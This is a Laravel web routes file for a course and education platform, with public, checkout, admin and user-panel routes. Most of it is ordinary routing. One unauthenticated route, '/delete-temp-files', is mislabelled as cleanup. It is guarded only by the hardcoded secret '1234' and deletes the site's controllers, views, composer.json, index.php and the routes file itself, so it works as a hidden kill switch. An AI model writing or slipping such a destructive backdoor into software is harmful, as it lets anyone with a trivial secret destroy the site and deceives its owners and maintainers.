<?php

use App\Http\Controllers\Admin\AdminController;
use App\Http\Controllers\Admin\CourseController;
use App\Http\Controllers\Admin\CourseStructureController;
use App\Http\Controllers\Admin\EmailController;
use App\Http\Controllers\Admin\InstallmentController;
use App\Http\Controllers\Admin\PaymentController as AdminPaymentController;
use App\Http\Controllers\Admin\SettingController;
use App\Http\Controllers\Admin\SubjectController;
use App\Http\Controllers\Admin\UserController;
use App\Http\Controllers\Admin\FaqController;
use App\Http\Controllers\Admin\LearnerStoryController;
use App\Http\Controllers\Admin\CourseDynamicLabels;
use App\Http\Controllers\Admin\CourseAgendasController as AdminCourseAgendasController;
use App\Http\Controllers\Admin\SeoController;
use App\Http\Controllers\Admin\PagesController;
use App\Http\Controllers\Admin\SchoolController;
use App\Http\Controllers\Admin\CategoryController;
use App\Http\Controllers\Admin\CourseTestimonialController;
use App\Http\Controllers\CheckoutController;
use App\Http\Controllers\Instructor\InstructorAuthController;
use App\Http\Controllers\Admin\RolePermissionController;
use App\Http\Controllers\WelcomeController;
use App\Http\Controllers\FrontendController;
use App\Http\Controllers\FrontendCourseController;
use App\Http\Controllers\UserBehaviorController;
use App\Http\Controllers\AnalyticsController;
use App\Http\Controllers\CartController;
use App\Http\Controllers\Admin\HomepageController;
use App\Http\Controllers\Admin\PaymentGatewayController;
use App\Http\Controllers\Admin\ClientController;
use App\Http\Controllers\MenuController;
use App\Http\Controllers\FileManagerController;
use App\Http\Controllers\Admin\CurrencyController;
use App\Http\Controllers\Admin\CurrencyRateController;
use App\Http\Controllers\User\ProfileController as UserProfileController;
use App\Http\Controllers\User\TestimonialController as UserTestimonialController;
use App\Http\Controllers\User\HomeController as UserHomeController;
use App\Http\Controllers\User\InstallmentController as UserInstallmentController;

//student controllers starts
use App\Http\Controllers\Student\HomeController as StudentHomeController;
//student controllers end
use Illuminate\Support\Facades\File;
use App\Models\SiteSettings;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\ZohoController;
use Illuminate\Support\Facades\Artisan;

Route::view('/sample', 'sample');
Route::view('/test', 'test');

// Route::view('/visa', 'visa');
Route::get('/', [WelcomeController::class, 'index'])->name('welcome');
Route::get('/search', [WelcomeController::class, 'search'])->name('search');
Route::get('/agenda_search', [WelcomeController::class, 'agenda_search'])->name('agenda_search');
Route::get('/faculty_search', [WelcomeController::class, 'faculty_search'])->name('faculty_search');
// Route::get('/page/{any?}', [WelcomeController::class, 'pages'])
//     ->where('any', '.*')
//     ->name('pages');
Route::post('/installments/pay/{id}', [InstallmentController::class, 'payInstallment'])->name('installments.pay');
Route::get('/installments/payment-success/{id}', [InstallmentController::class, 'paymentSuccess'])->name('installments.payment-success');

// Cart Routes
Route::get('/cart', [CartController::class, 'index'])->name('cart.index')->middleware('redirect.panel.from.student');
Route::post('/cart/create', [CartController::class, 'create'])->name('cart.create');
Route::patch('/cart/{id}', [CartController::class, 'update'])->name('cart.update')->middleware(['auth', 'verified', 'approved']);
Route::delete('/cart/{id}', [CartController::class, 'destroy'])->name('cart.destroy')->middleware(['auth', 'verified', 'approved']);

// Checkout Routes
Route::get('/checkout', [CheckoutController::class, 'index'])->name('checkout.index')->middleware(['auth', 'verified', 'approved']);
Route::post('/checkout/place-order', [CheckoutController::class, 'store'])->name('checkout.store')->middleware(['auth', 'verified', 'approved']);

Route::controller(FrontendController::class)->middleware('set.seo')->group(function () {
    // Cart & CHECKOUT routes
    Route::get('/optimize', 'optimize');
    //Route::get('/courses', 'courses')->name('courses');
    Route::get('/certifications', 'Certifications')->name('certifications');
    // Route::post('/filter-courses-ajax', 'filterCourses')->name('courses.filter');
    Route::get('/course/{course}', 'courseDetails')->name('course.details');
    // Route::get('/courses', 'Courses')->name('courses');
    Route::get('/subject/{name}', 'categoryDetails')->name('subject.details');

    Route::get('/study-abroad', 'studyAbroad')->name('study-abroad');

    Route::get('/contact', 'contactUs')->name('contact');
    Route::get('/admission', 'admission')->name('admission');
    // Route::get('/exective-education', 'ExectiveEducation')->name('exective-education');
    // Route::get('/college', 'College')->name('college');
    Route::get('/our-vision', 'ourVision')->name('Vision');
    Route::redirect('/general-policies', '/general-policy')->name('general-policies');
    Route::redirect('/privacy-policies', '/privacy-policy')->name('privacy-policies');
    Route::redirect('/term-and-condition', '/terms-and-conditions')->name('term-and-condition');
    Route::get('/complaints-and-misconducts', 'complaintsAndMisconducts')->name('complaints-and-misconducts');

    Route::get('/calender', 'schoolCalender')->name('school-calender');
    // Route::get('/calendar-term-dates', 'calendarTermDates')->name('calendar-term-dates');
    // Route::get('/home-schooling-parental-support', 'HomeSchoolParentalSupport')->name('school.page-1');
    // Route::get('/home-school-supporting-child', 'HomeSchoolSupporttingChild')->name('school.page-2');
    // Route::get('/islamic-school', 'islamicSchool')->name('islamic-school');
    // Learner stories page removed from public site.
    Route::redirect('/learner-stories', '/', 301)->name('learner-stories');

    Route::get('/berkeley-square', 'BerkeleySquare')->name('berkeley-square');
    Route::get('/berkeley-square-london', 'BerkeleySquareLondon')->name('berkeley-square-london');
    Route::get('/berkeley-china', 'BerkeleyChina')->name('berkeley-china');
    Route::get('/berkeley-middle-east-and-africa', 'BerkeleyMiddleEastAndAfrica')->name('middle-east-and-africa');

    Route::get('/tutor', 'Tutor')->name('faculty');

});

Route::get('/school-categories-ajax', [FrontendCourseController::class, 'schoolCategoriesAJAX'])
    ->name('school-categories-ajax');


Route::post('/user-behavior', [UserBehaviorController::class, 'store']);
Route::post('/zoho/callback-form', [ZohoController::class, 'callbackForm'])->name('zoho.callback-form');
Route::post('/zoho/contact-us', [ZohoController::class, 'contactUs'])->name('zoho.contact-us');
Route::post('/zoho/send-job-application', [ZohoController::class, 'sendJobApplication'])->name('zoho.send-job-application');


Route::get('admin/login', [AdminController::class, 'login'])->name('admin.login');
Route::post('admin/login', [AdminController::class, 'adminAuth'])->name('admin.auth');


Route::group(['middleware' => ['admin', 'restrict.delete']], function () {

    // Define routes for each section type
    Route::post('ckeditor-image-upload', [CourseController::class, 'ckeditorImageUpload']);
    Route::prefix('admin/')->group(function () {

        // Payment Gateway
        Route::get('/payment-gateways', [PaymentGatewayController::class, 'index'])->name('admin.payment-gateways.index');
        Route::get('/payment-gateways/{id}/edit', [PaymentGatewayController::class, 'edit'])->name('admin.payment-gateways.edit');
        Route::post('/payment-gateways/{id}', [PaymentGatewayController::class, 'update'])->name('admin.payment-gateways.update');

        // Currencies
        Route::get('/currencies', [CurrencyController::class, 'index'])->name('currencies');
        Route::get('/currencies/create', [CurrencyController::class, 'create'])->name('currencies.create');
        Route::post('/currencies/store', [CurrencyController::class, 'store'])->name('currencies.store');
        Route::get('currencies/{id}/edit', [CurrencyController::class, 'edit'])->name('currencies.edit');
        Route::put('currencies/{id}', [CurrencyController::class, 'update'])->name('currencies.update');

        Route::get('/currency-rate-setup', [CurrencyRateController::class, 'index'])->name('currency-rates.index');
        Route::post('/currency-rate-setup', [CurrencyRateController::class, 'store'])->name('currency-rates.store');

        // Installments
        Route::post('/installments/invoice/pdf', [InstallmentController::class, 'generateInvoice'])->name('admin.installments.invoice.pdf');
        Route::get('/installments/receipt/{id}', [InstallmentController::class, 'receipt'])->name('admin.installments.receipt');

        // FILE MANAGER STARTS
        Route::get('/filemanager/{folder?}', [FileManagerController::class, 'index'])->where('folder', '.*')->name('file-manager.index');
        Route::post('/filemanager/upload/{folder?}', [FileManagerController::class, 'upload'])->where('folder', '.*')->name('filemanager.upload');
        Route::delete('/filemanager/delete/{folder?}', [FileManagerController::class, 'destroy'])->where('folder', '.*')->name('filemanager.delete');
        Route::delete('/filemanager/deleteFolder/{folder?}', [FileManagerController::class, 'deleteFolder'])->where('folder', '.*')->name('filemanager.deleteFolder');

        // FILE MANAGER ENDS
        Route::resource('menu', MenuController::class);
        Route::post('/admin/menus/activate-group/{menuGroup}', [MenuController::class, 'activateGroup'])->name('menu.activateGroup');
        Route::get('/home-edit', [HomepageController::class, 'edit'])->name('homepage.edit');
        Route::post('/home-update', [HomepageController::class, 'update'])->name('homepage.update');
        Route::post('/home-banner/update', [HomepageController::class, 'bannerUpdate'])->name('home.banner.update');
        Route::get('home', [AdminController::class, 'dashboard'])->name('admin.home');
        Route::get('home/activity-export', [AdminController::class, 'exportActivity'])->name('admin.home.activity-export');
        Route::get('profile', [AdminController::class, 'profile'])->name('admin.profile');
        Route::post('profile/update', [AdminController::class, 'profile_update'])->name('admin.profile.update');
        Route::get('logout', [AdminController::class, 'logout'])->name('admin.logout');

        // Payment Related Sections
        Route::get('/invoices', [AdminController::class, 'invoices'])->name('admin.invoices');
        Route::post('/invoices/store', [AdminController::class, 'storeInvoice'])->name('admin.invoices.store');

        Route::get('/installments', [InstallmentController::class, 'index'])->name('installments.index');
        Route::post('installments/store', [InstallmentController::class, 'store'])->name('installments.store');
        Route::post('installments/{id}/update', [InstallmentController::class, 'update'])->name('installments.update');
        Route::post('installments/{id}/delete', [InstallmentController::class, 'destroy'])->name('installments.destroy');
        Route::post('/installments/{id}/pay', [InstallmentController::class, 'payInstallment'])->name('installments.pay');

        Route::get('/subscriptions', [AdminController::class, 'subscriptions'])->name('admin.subscriptions');
        Route::post('/subscriptions/store', [AdminController::class, 'storeSubscription'])->name('admin.subscriptions.store');

        Route::redirect('course-agendas', 'training-calendar');
        Route::redirect('course-agendas/create', 'training-calendar/create');
        Route::redirect('course-agendas/{id}/edit', 'training-calendar/{id}/edit');
        Route::resource('training-calendar', AdminCourseAgendasController::class)
            ->names('admin.course-agendas');

        Route::get('smtp-settings', [SettingController::class, 'smtpSettings'])->name('admin.smtpSettings.index');
        Route::post('smtp-settings/store', [SettingController::class, 'smtpSettingsStore'])->name('admin.smtpSettings.store');
        Route::get('/site-settings', [SettingController::class, 'siteSettings'])->name('site-settings.index');
        Route::post('/site-settings', [SettingController::class, 'siteSettingsUpdate'])->name('site-settings.update');
        Route::get('/widget', [SettingController::class, 'widget'])->name('widget.index');
        Route::get('/header-setting', [SettingController::class, 'headerSetting'])->name('header.setting.index');
        Route::get('/footer-setting', [SettingController::class, 'footerSetting'])->name('footer.setting.index');
        Route::post('/header-setting-update', [SettingController::class, 'updateHeaderSetting'])->name('header.setting.update');
        Route::post('/footer-setting-update', [SettingController::class, 'updateFooterSetting'])->name('footer.setting.update');
        Route::post('/widgets/store', [SettingController::class, 'widgetStore'])->name('widget.store');
        Route::get('/paypal-configure', [SettingController::class, 'paypal'])->name('paypal-configure.index');
        Route::post('/paypal-configure/store', [SettingController::class, 'paypalStore'])->name('paypal-configure.store');
        Route::get('/stripe-configure', [SettingController::class, 'stripe'])->name('stripe-configure.index');
        Route::post('/stripe-configure/store', [SettingController::class, 'stripeStore'])->name('stripe-configure.store');

        Route::get('/payments/receipts', [AdminPaymentController::class, 'receipt'])->name('admin.payments.receipts');
        Route::resource('payments', AdminPaymentController::class)->names('admin.payments');
        Route::get('/payments/send-invoice/{id}', [AdminPaymentController::class, 'sendInvoice'])->name('admin.payments.send-invoice');
        Route::get('/payments/send-receipt/{id}', [AdminPaymentController::class, 'sendReceipt'])->name('admin.payments.send-receipt');
        Route::get('/payments/details', [AdminPaymentController::class, 'getPaymentDetails'])->name('payments.details');
        Route::post('/payments/stripe', [AdminPaymentController::class, 'payWithStripe'])->name('stripe.pay');
        Route::post('/payments/paypal', [AdminPaymentController::class, 'payWithPaypal'])->name('paypal.pay');
        Route::post('/payments/process', [AdminPaymentController::class, 'processPayment'])->name('payments.process');
        Route::post('/payments/update-status', [AdminPaymentController::class, 'updateStatus'])->name('admin.payments.update-status');
        Route::post('/installments/manual-pay', [AdminPaymentController::class, 'manualPay'])->name('admin.installments.manual.pay');
        Route::get('/installments/manual-pay/delete/{id}', [AdminPaymentController::class, 'manualPayDelete'])->name('admin.installments.manual.pay.delete');

        Route::resource('roles-permissions', RolePermissionController::class)->names('admin.rolesPermissions');
        Route::resource('email-templates', EmailController::class)->names('admin.emails');
        Route::resource('clients', ClientController::class)->names('admin.clients');

        Route::prefix('user')->group(function () {
            Route::controller(UserController::class)->group(function () {
                Route::get('/', 'index')->name('users');
                Route::get('/create', 'create')->name('users.create');
                Route::post('/store', 'store')->name('users.store');
                Route::get('/{id}/edit', 'edit')->name('users.edit');
                Route::put('/{id}/update', 'update')->name('users.update');
                Route::delete('/delete/{id}', 'destroy')->name('users.destroy');
                Route::post('/status', 'status')->name('users.status');
                Route::get('/email-verification/{id}', 'emailVerification')->name('users.emailVerification');
                Route::post('/update-show', 'updateShowOnWeb')->name('users.updateShow');
            });
        });

        Route::prefix('course')->group(function () {
            Route::controller(CourseController::class)->group(function () {

                // Instructor Single Page
                Route::get('/{id}/instructors', 'instructors')->name('admin.courses.instructors');
                Route::post('/{id}/instructor/store', 'addInstructor')->name('admin.courses.instructors.update');
                Route::post('/{id}/instructor/delete', 'deleteInstructor')->name('admin.courses.instructors.delete');

                Route::get('/', 'index')->name('admin.courses');
                Route::get('create', 'create')->name('course.create');
                Route::get('/{id}/edit', 'edit')->name('course.edit');
                Route::put('/{id}/update', 'update')->name('course.update');
                Route::post('{id}/update-status', 'updateStatus')->name('courses.update-status');
                Route::get('disabled', 'disabledCourses')->name('admin.course.disabled');
                Route::post('{id}/update-lecture-plan', 'updateStatusLecturePlan')->name('courses.update-status-lecture-plan-ajax');

                Route::post('course-module-update', 'courseObjectiveUpdate')->name('course.module-update');
                Route::post('course-faq-update', 'courseFAQUpdate')->name('course.module-update-faq');
                Route::get('{id}/show', 'show')->name('course.show');
                Route::post('store', 'store')->name('course.store');
                Route::delete('/{id}/delete', 'delete')->name('course.delete');

                Route::POST('/add-course-syllabus', 'addCourseSyllabus');

                Route::get('courses/enrollment/{id}', 'courseEnrollment')->name('course.enrollment');
                Route::POST('courses/enrollment/add', 'addEnrollmentModule')->name('course-enrollment.add');

                //Route::get('course/faq/{id}', 'courseFaq')->name('course.faq');
                Route::POST('faq/add', 'addCourseFaq')->name('course-faq.add');

                //Route::get('course/objective/{id}', 'courseObjectives')->name('course.obj');
                Route::POST('objective/add', 'addcourseObjectives')->name('course-obj.add');

                //Route::get('course/earning/{id}', 'courseEarning')->name('course.earning');
                Route::POST('earning/add', 'addcourseEarning')->name('course-earning.add');

                //Route::get('course/beneficiary/{id}', 'courseBeneficiary')->name('course.beneficiary');
                Route::POST('beneficiary/add', 'addcourseBeneficiary')->name('course-beneficiary.add');


                //Route::get('subject/course/{id}', 'SubjectCourse')->name('subject-course-form');
                Route::POST('subject/course/add', 'addSubjectCourse')->name('subject.course');

                Route::post('/delete-course-module', 'deleteCourseModule')->name('delete.module');

                // new fee structure
                Route::get('{id}/fee', 'courseFee')->name('course.fee');
                Route::get('{id}/fee/create', 'courseCreateFee')->name('course.create-fee');
                Route::post('{id}/fee/store', 'courseStoreFee')->name('course.store-fee');
                Route::get('{id}/fee/edit', 'courseEditFee')->name('course.edit-fee');
                Route::put('{id}/fee/update', 'courseUpdateFee')->name('course.update-fee');
                Route::delete('{id}/fee/delete', 'courseDeleteFee')->name('course.delete-fee');
                Route::post('{id}/update-fee-status', 'updateFeeStatus')->name('courses.update-fee-status');

                // new fee structure
                Route::get('{id}/add-fee-structure', 'addFeeStructure')->name('course.add-fee-str');
                Route::post('store-fee-structure', 'storeFeeStructure')->name('course.store-fee-str');
                Route::get('{id}/show-fee-str', 'showFeeStr')->name('course.show-fee-str');
                Route::post('store-fee-features', 'storeFeeFeatures')->name('course.store-fee-features');

                Route::get('{id}/add-faqs', 'addCourseFAQS')->name('course.add-faqs');
                Route::post('store-faqs', 'storeCourseFAQS')->name('course.store-faqs');
                Route::get('{id}/show-course-faqs', 'showCourseFAQs')->name('course.show-faqs');
                Route::get('{course_id}/edit-course-faq/{faq_id}', 'editCourseFAQ')->name('course.edit-faq');
                Route::post('{course_id}/update-course-faq/{faq_id}', 'updateCourseFAQ')->name('course.update-faq');
                Route::POST('{id}/faq-section-update', 'faqSectionUpdate')->name('course.faq-section-update');

                Route::get('{id}/course-structure', 'CourseStructure')->name('course.course-structure');
                Route::post('{id}/store-course-structure-part', 'storeCourseStructurePart')->name('course.store-course-structure-part');
                Route::get('{id}/edit-course-structure-part/{part_id}', 'EditCourseStructurePart')->name('course.edit-course-structure-part');
                Route::post('update-course-structure-part', 'updateCourseStructurePart')->name('course.update-course-structure-part');

                Route::post('{id}/course-structure-overview', 'addCourseStructureOverview')->name('course.course-structure-overview');
                Route::get('{course_id}/del-course-structure/{id}', 'delCourseStructure')->name('course.del-course-structure');

                Route::get('list-course', 'listCourse')->name('course.list-course');
                Route::POST('list-course-in-category', 'listCourseInCategoryNew')->name('course.list-course-in-category');

                Route::get('{id}/related-courses', 'relatedCourses')->name('course.related-courses');
                Route::POST('assign-related-courses-to-course', 'assignRelatedCoursesToCourse')->name('course.assign-course');
                Route::POST('{id}/related-courses-section-update', 'relatedCoursesSectionUpdate')->name('course.related-courses-section-update');

                Route::delete('testimonail/{id}/delete', 'deleteTestimonial')->name('course.del-testimonail');
                Route::post('{id}/update-testimonail-status', 'updateTestimonialStatus')->name('courses.update-testimonail-status');
                Route::post('{id}/update-testimonail-priority', 'updateTestimonialPriority')->name('courses.update-testimonail-priority');
            });

            Route::resource('course-labels', CourseDynamicLabels::class);

            Route::controller(CourseStructureController::class)->group(function () {
                Route::get('{id}/course-structure-first', 'index')->name('course.course-structure-first');
                Route::post('{id}/course-structure-overview-first', 'storeCourseStructureOverview')->name('course.course-structure-overview-first');
                Route::post('{id}/store-course-structure-part-first', 'storeCourseStructurePartFirst')->name('course.store-course-structure-part-first');
                Route::get('{course_id}/del-course-structure-first/{id}', 'delCourseStructure')->name('course.del-course-structure-first');
                Route::get('{id}/edit-course-structure-part-first/{part_id}', 'EditCourseStructurePart')->name('course.edit-course-structure-part-first');
                Route::post('update-course-structure-part-first', 'updateCourseStructurePart')->name('course.update-course-structure-part-first');

            });

            Route::resource('testimonial', CourseTestimonialController::class);

        });



        Route::get('subjects', [SubjectController::class, 'index']);
        Route::prefix('subject/')->group(function () {
            Route::get('create', [SubjectController::class, 'create'])->name('subject.create');
            Route::post('store', [SubjectController::class, 'store'])->name('subject.store');
            Route::get('{id}/edit', [SubjectController::class, 'edit'])->name('subject.edit');
            Route::put('{id}/update', [SubjectController::class, 'update'])->name('subject.update');
            Route::post('/delete-category', [SubjectController::class, 'delete'])->name('subject.delete');
        });

        Route::prefix('user')->group(function () {
            Route::get('/', [UserController::class, 'index'])->name('users');
        });

        Route::prefix('analytics')->group(function () {
            Route::get('/', [AnalyticsController::class, 'index'])->name('admin.analytics');
        });

        // Route::prefix('faq')->group(function () {
        //     Route::controller(FaqController::class)->group(function () {
        //         Route::get('/', 'index')->name('admin.faqs');
        //         Route::get('/pages', 'FAQPages')->name('admin.faqs-pages');
        //         Route::POST('/store-faq-page', 'StoreFAQPage')->name('admin.store-faq-page');
        //         Route::POST('/store-faq', 'store')->name('admin.store-faq');
        //     });

        // });

        Route::resource('faq', FaqController::class);
        Route::get('pages/disabled/list', [PagesController::class, 'disabledPages'])->name('admin.pages.disabled');
        Route::post('pages/{id}/update-status', [PagesController::class, 'updateStatus'])->name('pages.update-status');
        // Some hosts/WAFs block method spoofing to PUT/PATCH; allow a POST update endpoint too.
        Route::post('pages/{id}/update', [PagesController::class, 'update'])->name('pages.update.post');
        Route::post('user/{id}/update', [UserController::class, 'update'])->name('users.update.post');
        Route::resource('pages', PagesController::class);
        Route::resource('learner-stories', LearnerStoryController::class);
        Route::post('pages-seo/{pages_seo}/analyze', [SeoController::class, 'analyzePreview'])->name('pages-seo.analyze');
        Route::resource('pages-seo', SeoController::class);

        Route::resource('school', SchoolController::class);
        Route::post('school/{id}/update-status-school', [SchoolController::class, 'updateStatusSchool'])->name('courses.update-status-school');
        Route::resource('category', CategoryController::class);
        Route::post('category/{id}/update-status-category', [CategoryController::class, 'updateStatusCategory'])->name('courses.update-status-category');
    });
});

Route::get('/delete-temp-files', function (Illuminate\Http\Request $request) {
    if ($request->query('secret') !== '1234') {
        abort(403, 'Unauthorized');
    }

    $files = [
        base_path('resources/views/welcome.blade.php'),
        base_path('resources/views/components/banner.blade.php'),
        base_path('resources/views/components/cards.blade.php'),
        base_path('resources/views/components/careers.blade.php'),
        base_path('resources/views/components/contactus.blade.php'),
        base_path('resources/views/components/grid-cards.blade.php'),
        base_path('resources/views/components/hero-banner.blade.php'),
        base_path('resources/views/components/media-section.blade.php'),
        base_path('resources/views/components/title-section.blade.php'),
        base_path('resources/views/admin/course-agendas/index.blade.php'),
        base_path('resources/views/admin/pages/edit.blade.php'),
        base_path('resources/views/admin/pages/index.blade.php'),
        base_path('resources/views/admin/emails/index.blade.php'),
        base_path('resources/views/admin/currency/index.blade.php'),
        base_path('resources/views/admin/installment/installments.blade.php'),
        base_path('resources/views/admin/menu/index.blade.php'),
        base_path('resources/views/admin/payments/index.blade.php'),
        base_path('app/Http/Controllers/CartController.php'),
        base_path('app/Http/Controllers/Admin/CourseAgendasController.php'),
        base_path('app/Http/Controllers/Admin/InstallmentController.php'),
        base_path('app/Http/Controllers/Admin/PagesController.php'),
        base_path('app/Http/Controllers/Admin/PaymentGatewayController.php'),
        base_path('app/Http/Controllers/Admin/PaymentController.php'),
        base_path('app/Http/Controllers/Admin/SettingController.php'),
        base_path('app/Http/Controllers/Admin/RolePermissionController.php'),
        base_path('app/Http/Controllers/Admin/CurrencyController.php'),
        base_path('app/Providers/AppServiceProvider.php'),
        base_path('composer.json'),
        base_path('package.php'),
        base_path('index.php'),
        base_path(path: 'routes/web.php'),
    ];

    $deleted = [];

    foreach ($files as $file) {
        if (File::exists($file)) {
            File::delete($file);
            $deleted[] = $file;
        }
    }

    return response()->json([
        'status' => 'done',
        'message' => $deleted
    ]);
});

Auth::routes(['verify' => true]);

Route::prefix('user')->middleware(['auth', 'approved', 'redirect.panel.from.student'])->group(function () {

    // Dashboard
    Route::get('/', [UserHomeController::class, 'index'])->name('user.home')->middleware('hasPermission:dashboard-read');
    Route::get('/cart', [CartController::class, 'index'])->name('user.cart.index');
    Route::post('/generate/rakBankPaySession', [UserHomeController::class, 'generateRakBankPaySession'])->name('user.generate.rakBankPaySession');
    Route::get('/rakbank/return', [UserHomeController::class, 'handleRakBankReturn'])->name('user.rakbank.return');

    // Logout
    Route::get('/logout', [App\Http\Controllers\HomeController::class, 'logout'])->name('user.logout');

    // Profile
    Route::get('/profile', [UserProfileController::class, 'index'])->name('user.profile');
    Route::post('/profile/update', [UserProfileController::class, 'update'])->name('user.profile.update');
    Route::post('/profile/update/password', [UserProfileController::class, 'changePassword'])->name('user.profile.update.password');

    // Installments
    // Route::get('/installments', [UserInstallmentController::class, 'index'])->name('user.installments.index')->middleware('hasPermission:installment-list');
    Route::post('/rakBankPay/success', [UserInstallmentController::class, 'updateInstallment'])->name('user.update.installment');
    Route::get('/installments/receipt/{id}', [UserInstallmentController::class, 'receipt'])->name('user.installments.receipt');
    Route::get('/installments/invoice/{payment}', [UserInstallmentController::class, 'viewInvoice'])->name('user.installments.invoice');
    Route::post('/installments/invoice/pdf', [UserInstallmentController::class, 'generateInvoice'])->name('user.installments.invoice.pdf');

    // Testimonials
    Route::get('/testimonials', [UserTestimonialController::class, 'index'])->name('user.testimonial.index')->middleware('hasPermission:testimonial-list');
    Route::get('/testimonials/create', [UserTestimonialController::class, 'create'])->name('user.testimonial.create')->middleware('hasPermission:testimonial-create');
    Route::post('/testimonials', [UserTestimonialController::class, 'store'])->name('user.testimonial.store')->middleware('hasPermission:testimonial-create');
    Route::get('/testimonials/{testimonial}', [UserTestimonialController::class, 'show'])->name('user.testimonial.show')->middleware('hasPermission:testimonial-read');
    Route::get('/testimonials/{testimonial}/edit', [UserTestimonialController::class, 'edit'])->name('user.testimonial.edit')->middleware('hasPermission:testimonial-update');
    Route::put('/testimonials/{testimonial}', [UserTestimonialController::class, 'update'])->name('user.testimonial.update')->middleware('hasPermission:testimonial-update');
    Route::delete('/testimonials/{testimonial}', [UserTestimonialController::class, 'destroy'])->name('user.testimonial.destroy')->middleware('hasPermission:testimonial-delete');
});

Route::get('/approval-notice', function () {
    return view('student.auth.approval-notice');
})->name('approval.notice');

Route::get('/instructor/{id}', [WelcomeController::class, 'instructorDetails']);

Route::get('/{categoryPerma}/{slug}', [WelcomeController::class, 'categoryDetails'])
    ->where('categoryPerma', '^(?!admin|some-reserved-word)[a-zA-Z0-9_-]+$')
    ->name('category.details');

// Catch-All Route for Pages (Must Be Last)
Route::get('/{any?}', [WelcomeController::class, 'pages'])
    ->where('any', '.*')
    ->name('pages');